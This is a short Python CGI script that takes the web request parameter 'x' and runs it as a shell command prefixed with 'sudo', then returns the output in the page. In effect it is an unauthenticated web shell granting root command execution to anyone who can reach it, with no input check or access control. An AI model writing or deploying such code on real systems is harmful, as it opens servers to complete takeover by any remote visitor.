#!/usr/bin/python3

import cgi
import subprocess

print("content-type: text/html")
print()

fs = cgi.FieldStorage()
c = fs.getvalue("x")

op = subprocess.getoutput("sudo " +c)
print(op)